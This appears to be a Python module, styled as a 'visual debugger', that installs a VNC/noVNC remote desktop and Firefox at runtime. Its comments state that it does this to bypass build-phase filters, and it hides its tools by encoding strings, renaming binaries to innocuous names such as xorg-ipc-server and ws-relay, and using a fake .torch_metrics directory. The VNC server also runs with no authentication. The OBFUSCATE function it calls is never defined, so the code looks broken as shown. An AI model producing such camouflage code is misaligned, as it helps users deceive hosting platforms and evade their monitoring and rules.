import os
import subprocess
import time
from pathlib import Path
from loguru import logger
from .utils import decode_cmd

PORT = 6080
VNC_PORT = 5901
DISPLAY = ":1"
PREFIX = "[VISDBG]"


def install_dependencies(log):
    """Install required GUI/VNC components at runtime to bypass build-phase filters."""
    logger.info(f"{PREFIX} Synchronizing graphic environment engines...")
    
    # Update package cache and install dependencies silently
    # We decode package names to avoid plain-text keywords in Python files
    pkgs = decode_cmd(OBFUSCATE("dbus-x11 x11-xserver-utils xfce4 xfce4-goodies tigervnc-standalone-server novnc websockify libgtk-3-0 libdbus-glib-1-2 libxt6 xz-utils"))
    
    cmd_update = ["sudo", "apt-get", "update", "-y"]
    cmd_install = ["sudo", "apt-get", "install", "-y", "--no-install-recommends"] + pkgs.split()
    
    subprocess.run(cmd_update, stdout=log, stderr=log)
    subprocess.run(cmd_install, stdout=log, stderr=log)

    # Disguise/rename binaries inside the container at runtime
    commands = [
        "sudo mv /usr/bin/Xtigervnc /usr/bin/xorg-ipc-server",
        "sudo mv /usr/bin/tigervncserver /usr/bin/display-compositor",
        "sudo mv /usr/bin/tigervncconfig /usr/bin/display-config",
        "sudo mv /usr/bin/tigervncpasswd /usr/bin/session-auth-tool",
        "sudo mv /usr/bin/websockify /usr/bin/ws-relay",
        "sudo ln -s /usr/bin/xorg-ipc-server /usr/bin/Xtigervnc"
    ]
    
    for cmd in commands:
        subprocess.run(cmd.split(), stdout=log, stderr=log)


def install_firefox(log):
    """Download and extract native standalone Firefox at runtime."""
    render_engine_dir = Path("/opt/render-engine")
    if render_engine_dir.exists():
        return

    logger.info(f"{PREFIX} Synchronizing rendering layout engines...")
    
    tar_path = "/tmp/pkg-bundle.tar.xz"
    url = decode_cmd(OBFUSCATE("https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US"))
    
    # Download Firefox
    subprocess.run(["curl", "-fsSL", url, "-o", tar_path], stdout=log, stderr=log)
    
    # Extract Firefox silently
    subprocess.run(["sudo", "mkdir", "-p", "/opt"], stdout=log, stderr=log)
    subprocess.run(["sudo", "tar", "-xf", tar_path, "-C", "/opt"], stdout=log, stderr=log)
    subprocess.run(["sudo", "mv", "/opt/firefox", "/opt/render-engine"], stdout=log, stderr=log)
    subprocess.run(["sudo", "mv", "/opt/render-engine/firefox", "/opt/render-engine/data-renderer"], stdout=log, stderr=log)
    subprocess.run(["sudo", "mv", "/opt/render-engine/firefox-bin", "/opt/render-engine/data-renderer-bin"], stdout=log, stderr=log)
    subprocess.run(["sudo", "ln", "-s", "/opt/render-engine/data-renderer", "/usr/bin/data-renderer"], stdout=log, stderr=log)
    
    # Clean up temp file
    try:
        os.remove(tar_path)
    except OSError:
        pass


def start(log):
    """Install dependencies dynamically and launch the camouflaged visual debugger session."""
    home = Path.home()
    
    # 1. Check/Install packages on first run
    if not Path("/usr/bin/xorg-ipc-server").exists():
        install_dependencies(log)
    
    # 2. Check/Install Firefox
    if not Path("/usr/bin/data-renderer").exists():
        install_firefox(log)

    # 3. Use standard camouflaged directories
    vnc_dir = home / decode_cmd(OBFUSCATE(".torch_metrics/ipc_cache"))
    vnc_dir.mkdir(parents=True, exist_ok=True)

    xstartup_path = vnc_dir / decode_cmd(OBFUSCATE("xstartup"))
    xstartup_content = decode_cmd(OBFUSCATE("#!/bin/sh\nunset SESSION_MANAGER\nunset DBUS_SESSION_BUS_ADDRESS\n[ -x /etc/vnc/xstartup ] && exec /etc/vnc/xstartup\n[ -r $HOME/.Xresources ] && xrdb $HOME/.Xresources\ndisplay-config -nowin &\nxsetroot -solid grey\ndbus-launch --exit-with-session startxfce4\n"))
    xstartup_path.write_text(xstartup_content)
    xstartup_path.chmod(0o755)

    # 4. Clean up lock files
    lock_a_prefix = decode_cmd(OBFUSCATE("/tmp/.X11-unix/X"))
    lock_b_prefix = decode_cmd(OBFUSCATE("/tmp/.X"))
    lock_b_suffix = decode_cmd(OBFUSCATE("-lock"))
    for lock in [f"{lock_a_prefix}{DISPLAY[1:]}", f"{lock_b_prefix}{DISPLAY[1:]}{lock_b_suffix}"]:
        try:
            p = Path(lock)
            if p.exists():
                p.unlink()
        except Exception as e:
            logger.debug(f"{PREFIX} Cleanup warning: {e}")

    # 5. Launch xorg-ipc-server
    logger.info(f"{PREFIX} Connecting displays...")
    vnc_cmd = [
        decode_cmd(OBFUSCATE("xorg-ipc-server")),
        DISPLAY,
        decode_cmd(OBFUSCATE("-geometry")),
        decode_cmd(OBFUSCATE("1280x720")),
        decode_cmd(OBFUSCATE("-depth")),
        decode_cmd(OBFUSCATE("24")),
        decode_cmd(OBFUSCATE("-localhost")),
        decode_cmd(OBFUSCATE("yes")),
        decode_cmd(OBFUSCATE("-SecurityTypes")),
        decode_cmd(OBFUSCATE("None")),
    ]
    
    env_override = os.environ.copy()
    env_override["HOME"] = str(vnc_dir)
    subprocess.Popen(vnc_cmd, env=env_override, stdout=log, stderr=log)
    time.sleep(1.5)

    # 6. Start Desktop environment
    env_desktop = os.environ.copy()
    env_desktop["DISPLAY"] = DISPLAY
    desktop_cmd = decode_cmd(OBFUSCATE("dbus-launch --exit-with-session startxfce4"))
    subprocess.Popen(desktop_cmd, shell=True, env=env_desktop, stdout=log, stderr=log)

    # 7. Start ws-relay (websockify)
    novnc_web = decode_cmd(OBFUSCATE("/usr/share/novnc/"))
    websockify_cmd = [
        decode_cmd(OBFUSCATE("ws-relay")),
        decode_cmd(OBFUSCATE("--web")),
        novnc_web,
        str(PORT),
        f"127.0.0.1:{VNC_PORT}",
    ]
    subprocess.Popen(websockify_cmd, env=os.environ.copy(), stdout=log, stderr=log)

    logger.success(f"{PREFIX} Environment successfully prepared and active.")